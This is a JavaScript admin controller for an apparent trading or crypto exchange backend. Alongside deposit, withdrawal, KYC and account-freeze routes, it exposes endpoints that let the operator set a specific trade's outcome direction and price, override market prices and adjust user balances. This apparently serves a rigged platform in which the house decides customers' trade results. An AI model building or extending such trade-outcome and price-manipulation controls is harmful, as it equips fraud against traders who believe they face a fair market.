const {
    getDashboard,
    reviewDeposit,
    reviewWithdrawal,
    reviewKyc,
    adjustBalances,
    updateTradeOverride,
    setTradeOutcomeControl,
    setMarketPriceOverride,
    setUserVipLevel,
    setUserFeeRates,
    freezeUserAccount,
    unfreezeUserAccount,
    addWithdrawalWhitelist,
    getPlatformStats,
    getAllUsers,
    getPendingRequests,
    approveDepositRequest,
    rejectDepositRequest,
    approveWithdrawalRequest,
    rejectWithdrawalRequest
} = require('../services/adminService');

async function getAdminDashboard(req, res) {
    try {
        const dashboard = await getDashboard();
        res.json(dashboard);
    } catch (error) {
        res.status(400).json({ error: error.message });
    }
}

async function reviewDepositRequest(req, res) {
    try {
        const { requestId } = req.params;
        const { status } = req.body;
        await reviewDeposit(req.user.id, requestId, status);
        res.json({ ok: true, requestId, status });
    } catch (error) {
        res.status(400).json({ error: error.message });
    }
}

async function reviewWithdrawalRequest(req, res) {
    try {
        const { requestId } = req.params;
        const { status } = req.body;
        await reviewWithdrawal(req.user.id, requestId, status);
        res.json({ ok: true, requestId, status });
    } catch (error) {
        res.status(400).json({ error: error.message });
    }
}

async function reviewUserKyc(req, res) {
    try {
        const { userId } = req.params;
        const { status } = req.body;
        await reviewKyc(req.user.id, userId, status);
        res.json({ ok: true, userId, status });
    } catch (error) {
        res.status(400).json({ error: error.message });
    }
}

async function adjustUserBalances(req, res) {
    try {
        const { userId } = req.params;
        const user = await adjustBalances(req.user.id, userId, req.body);
        res.json({ ok: true, user });
    } catch (error) {
        res.status(400).json({ error: error.message });
    }
}

async function setTradeOverride(req, res) {
    try {
        await updateTradeOverride(req.user.id, req.body);
        res.json({ ok: true });
    } catch (error) {
        res.status(400).json({ error: error.message });
    }
}

async function setTradeOutcome(req, res) {
    try {
        const { tradeId, direction, price } = req.body;
        await setTradeOutcomeControl(req.user.id, tradeId, direction, price);
        res.json({ ok: true, tradeId, direction, price });
    } catch (error) {
        res.status(400).json({ error: error.message });
    }
}

async function setMarketOverride(req, res) {
    try {
        await setMarketPriceOverride(req.user.id, req.body);
        res.json({ ok: true });
    } catch (error) {
        res.status(400).json({ error: error.message });
    }
}

async function getStats(req, res) {
    try {
        const stats = await getPlatformStats();
        res.json(stats);
    } catch (error) {
        res.status(400).json({ error: error.message });
    }
}

async function getUsers(req, res) {
    try {
        const { status } = req.query;
        const users = await getAllUsers(status || null);
        res.json(users);
    } catch (error) {
        res.status(400).json({ error: error.message });
    }
}

async function getPending(req, res) {
    try {
        const pending = await getPendingRequests();
        res.json(pending);
    } catch (error) {
        res.status(400).json({ error: error.message });
    }
}

async function approveDeposit(req, res) {
    try {
        const { requestId } = req.body;
        const result = await approveDepositRequest(req.user.id, requestId);
        res.json(result);
    } catch (error) {
        res.status(400).json({ error: error.message });
    }
}

async function approveWithdrawal(req, res) {
    try {
        const { requestId } = req.body;
        const result = await approveWithdrawalRequest(req.user.id, requestId);
        res.json(result);
    } catch (error) {
        res.status(400).json({ error: error.message });
    }
}

async function setVipLevel(req, res) {
    try {
        const { userId } = req.params;
        const { vipLevel } = req.body;
        await setUserVipLevel(req.user.id, userId, vipLevel);
        res.json({ ok: true, userId, vipLevel });
    } catch (error) {
        res.status(400).json({ error: error.message });
    }
}

async function setFeeRates(req, res) {
    try {
        const { userId } = req.params;
        await setUserFeeRates(req.user.id, userId, req.body);
        res.json({ ok: true, userId });
    } catch (error) {
        res.status(400).json({ error: error.message });
    }
}

async function freezeAccount(req, res) {
    try {
        const { userId } = req.params;
        const { reason } = req.body;
        await freezeUserAccount(req.user.id, userId, reason);
        res.json({ ok: true, userId, frozen: true });
    } catch (error) {
        res.status(400).json({ error: error.message });
    }
}

async function unfreezeAccount(req, res) {
    try {
        const { userId } = req.params;
        await unfreezeUserAccount(req.user.id, userId);
        res.json({ ok: true, userId, frozen: false });
    } catch (error) {
        res.status(400).json({ error: error.message });
    }
}

async function addWhitelist(req, res) {
    try {
        const { userId } = req.params;
        await addWithdrawalWhitelist(req.user.id, userId, req.body);
        res.json({ ok: true });
    } catch (error) {
        res.status(400).json({ error: error.message });
    }
}

module.exports = {
    getAdminDashboard,
    reviewDepositRequest,
    reviewWithdrawalRequest,
    reviewUserKyc,
    adjustUserBalances,
    setTradeOverride,
    setTradeOutcome,
    setMarketOverride,
    getStats,
    getUsers,
    getPending,
    approveDeposit,
    approveWithdrawal,
    setVipLevel,
    setFeeRates,
    freezeAccount,
    unfreezeAccount,
    addWhitelist
};
